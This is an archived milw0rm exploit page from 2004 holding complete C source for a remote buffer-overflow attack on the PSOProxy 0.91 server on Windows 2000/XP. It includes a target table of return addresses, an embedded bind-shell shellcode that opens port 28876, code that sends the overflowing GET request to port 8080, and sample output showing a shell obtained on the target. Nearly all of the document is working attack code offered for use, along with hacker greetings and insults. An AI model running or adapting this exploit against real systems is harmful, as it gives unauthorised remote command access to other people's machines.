<html><head><title>PSOProxy 0.91 Remote Buffer Overflow Exploit (Win2k/XP)
</title></head><pre>/*

	 Copyright © Rosiello Security

 	      http www rosiello org
 	    ================

 -== Remote Exploit for PSOProxy version v0.91 ==--
 Code by: rave
 Contact: rave@rosiello.org
 Date: Feb 2004
 Bug found by: Donato Ferrante

 There is a vulnerability found in the PSOProxy server.
 An attacker can execute arbitrary code exploiting remotely a buffer overflow.

	The exploit sends:

    GET / &lt;1021 x A&gt;&lt;adres of the shellcode&gt;&lt;shellcode&gt;

 This spawns a bindshell on the victim at port 28876..


 Usage &lt;C:\&gt;psoproxy-exploit.exe &lt;target host&gt; &lt;target number&gt;
 Target Number           Target Name                             Stack Adress
 =============           ===========                             ===========
 0                       Demo                                    0xBADC0DED
 1                       Windows XP Home Edtion SP1.             0x00D2FDDA
 2                       Windows XP Pro Edtion SP1.              0x00EDFDDC
 3                       Win2k Pro Edtion.                       0x00BBFDDC



 &lt;C:\&gt; psoproxy-exploit localhost 1
 [+] Winsock Inalized
 [+] Trying to connect to localhost:8080
 [+] socket inalized
 [+] Overflowing string is Prepared
 [+] Connected.
 [+] Overflowing string had been send


 &lt;C:\&gt; telnet localhost 28876
 Microsoft Windows XP [versie 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.

 &lt;D:\&gt;

 DO NOT USE THIS CODE ON DIFFERENT MACHINES BUT YOURS!!!
 Respect the law as we do!




   Special Tankz to:
   opy   { win2k 0wnage !! ty for lending me ur box }
   B0f   { Hope to work with u again in the futhure like we do all the time }
   Dragnet  { Always willing to help me out }
   Angelo  { Verry good maffio`so }


   Greetz go out to:
   Kajun  { Verry suportive guy }
   NrAziz { 0wns pakistan hax0r scene ! beware always say mr NrAziz }
   sloth  { good guy }
   Mercy  { Hope to see u soon }
   Netric security {www.netric.org/.de }
   [+] All the hax0rs i forgot.

   Hate Messages:
   Ziphie { U didnt get mine bitch }

  OOh and Li0n7 voila fr {
  you're doing it all wrong, your exploit doesn't work!
  http://www.securityfocus.com/archive/1/354769/2004-02-15/2004-02-21/0
  k/j man, keep on doing the good stuff and next time add some more stack adresses so
  it would work on other os`s...

  }



Advisory at: http://www.rosiello.org/en/read_bugs.php?15

*/


#include &lt;stdio.h&gt;
#include &lt;winsock2.h&gt;
#include &lt;errno.h&gt;
#include &lt;windows.h&gt;

// Darn fucking 1337 macro shit
#define ISIP(m) (!(inet_addr(m) ==-1))

#define offset 1024 //1024





struct remote_targets {
  char *os;
  unsigned long sh_addr;
} target [] ={
/* Option`s for your eyes only :D*/
    &quot;Demo                        &quot;,
     0xbadc0ded,


    &quot;Windows XP Home Edtion SP1. &quot;,
     0x00D2FDDA,

    &quot;Windows XP Pro Edtion SP1.  &quot;,
     0x00edfddc,


    &quot;Win2k Pro Edtion.          &quot;,
     0x00bbfddc,

 };






//Bindcode spawns a binshell on port 28876 (Thanks to metasploit.com guys)
unsigned char  shellcode[] =
  &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
  &quot;\xeb\x43\x56\x57\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x52\x8b\x52&quot;
  &quot;\x20\x01\xea\x31\xc0\x31\xc9\x41\x8b\x34\x8a\x01\xee\x31\xff\xc1&quot;
  &quot;\xcf\x13\xac\x01\xc7\x85\xc0\x75\xf6\x39\xdf\x75\xea\x5a\x8b\x5a&quot;
  &quot;\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01&quot;
  &quot;\xe8\x5f\x5e\xff\xe0\xfc\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b&quot;
  &quot;\x70\x1c\xad\x8b\x68\x08\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32&quot;
  &quot;\x2e\x64\x68\x77\x73\x32\x5f\x54\xbb\x71\xa7\xe8\xfe\xe8\x90\xff&quot;
  &quot;\xff\xff\x89\xef\x89\xc5\x81\xc4\x70\xfe\xff\xff\x54\x31\xc0\xfe&quot;
  &quot;\xc4\x40\x50\xbb\x22\x7d\xab\x7d\xe8\x75\xff\xff\xff\x31\xc0\x50&quot;
  &quot;\x50\x50\x50\x40\x50\x40\x50\xbb\xa6\x55\x34\x79\xe8\x61\xff\xff&quot;
  &quot;\xff\x89\xc6\x31\xc0\x50\x50\x35\x02\x01\x70\xcc\xfe\xcc\x50\x89&quot;
  &quot;\xe0\x50\x6a\x10\x50\x56\xbb\x81\xb4\x2c\xbe\xe8\x42\xff\xff\xff&quot;
  &quot;\x31\xc0\x50\x56\xbb\xd3\xfa\x58\x9b\xe8\x34\xff\xff\xff\x58\x60&quot;
  &quot;\x6a\x10\x54\x50\x56\xbb\x47\xf3\x56\xc6\xe8\x23\xff\xff\xff\x89&quot;
  &quot;\xc6\x31\xdb\x53\x68\x2e\x63\x6d\x64\x89\xe1\x41\x31\xdb\x56\x56&quot;
  &quot;\x56\x53\x53\x31\xc0\xfe\xc4\x40\x50\x53\x53\x53\x53\x53\x53\x53&quot;
  &quot;\x53\x53\x53\x6a\x44\x89\xe0\x53\x53\x53\x53\x54\x50\x53\x53\x53&quot;
  &quot;\x43\x53\x4b\x53\x53\x51\x53\x87\xfd\xbb\x21\xd0\x05\xd0\xe8\xdf&quot;
  &quot;\xfe\xff\xff\x5b\x31\xc0\x48\x50\x53\xbb\x43\xcb\x8d\x5f\xe8\xcf&quot;
  &quot;\xfe\xff\xff\x56\x87\xef\xbb\x12\x6b\x6d\xd0\xe8\xc2\xfe\xff\xff&quot;
  &quot;\x83\xc4\x5c\x61\xeb\x89\x41&quot;;


// now what would this button do ?
char *host_ip;
u_long get_ip(char *hostname)
{
 struct  hostent    *hp;

 if (ISIP(hostname)) return inet_addr(hostname);

  if ((hp = gethostbyname(hostname))==NULL)
  { perror (&quot;[+] gethostbyname() failed check the existance of the host.\n&quot;);
    exit(-1); }

  return (inet_ntoa(*((struct in_addr *)hp-&gt;h_addr)));
}


/// oooh yeah uuuh right ....
int usage (char *what)
{
 int i;
  fprintf(stdout,&quot;Copyright © Rosiello Security\n&quot;);
  fprintf(stdout,&quot;http://www.rosiello.org\n\n&quot;);
  fprintf(stdout,&quot;Usage %s &lt;target host&gt; &lt;target number&gt;\n&quot;,what);
  fprintf(stdout,&quot;Target Number\t\tTarget Name\t\t\t\tStack Adress\n&quot;);
  fprintf(stdout,&quot;=============\t\t===========\t\t\t\t===========\n&quot;);

  for (i=0;i &lt; 4;i++)
   fprintf(stdout,&quot;%d\t\t\t%s\t\t0x%p\n&quot;,i,target[i].os,target[i].sh_addr);

  exit(0);
}

int main(int argc,char **argv)

{


char buffer[offset*2]=&quot;get /&quot;,*ptr,*address;
int sd,oops,i,choise;
struct  sockaddr_in  ooh;


WSADATA wsadata;
WSAStartup(0x101, &amp;wsadata);

if (argc &lt; 2) usage(argv[0]);
address=argv[1];
choise=atoi(argv[2]);

fprintf(stdout,&quot;[+] Winsock Inalized\n&quot;);

 /* Lets start making a litle setup
    Change the port if you have to */

 ooh.sin_addr.s_addr = inet_addr(get_ip(address));
    ooh.sin_port        = htons(8080);
    ooh.sin_family      = AF_INET;


fprintf(stdout,&quot;[+] Trying to connect to %s:%d\n&quot;,address,8080);


// ok ok here`s ur sock()
sd = socket(AF_INET, SOCK_STREAM,IPPROTO_TCP);
 if (!sd&lt;0) { fprintf(stderr,&quot;[!] socket() failed.\n&quot;);exit (-1); }

 fprintf(stdout,&quot;[+] socket inalized\n&quot;);


 /* initializing the expploiting buffer, read the file comments for the details */
ptr=buffer+strlen(buffer);

for (i=strlen(buffer);i &lt; offset;i++) *ptr++=(char)0x2e;
for (i=strlen(buffer);i &lt; offset+6;i++) { *ptr++=(char)0xa; *ptr++=(char)0xd ;}

memcpy(buffer+strlen(buffer),((char *)&amp;shellcode),strlen(shellcode));
memcpy(buffer+offset,((char *)&amp;target[choise].sh_addr),3);


fprintf(stdout,&quot;[+] Overflowing string is Prepared\n&quot;);

 // Knock knock ... hi i want to hook up with you
 oops=connect(sd, (struct sockaddr *)&amp;ooh, sizeof( ooh ));
  if(oops!=0) { fprintf(stderr,&quot;[!] connect() failed.\n&quot;); exit(-1); }

// yep we are in :D
fprintf(stdout,&quot;[+] Connected.\n&quot;);


// Sending some Dangerous stuff
i = send(sd,buffer,strlen(buffer),0);
if (!i &lt;0) { fprintf (stdout,&quot;[!] Send() failed\n&quot;); exit (-1) ; }

fprintf(stdout,&quot;[+] Overflowing string had been send\n&quot;);


/* May psoproxy rest in peace (have cold a nice one and telnet to &lt;host&gt;  28876

 &lt;C:\&gt; telnet localhost 28876
 Microsoft Windows XP [versie 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.

 D:\&gt;
*/


// the cleaners !!
WSACleanup();

// [EOF]
return 0;

}

// milw0rm.com [2004-02-26]</pre></html>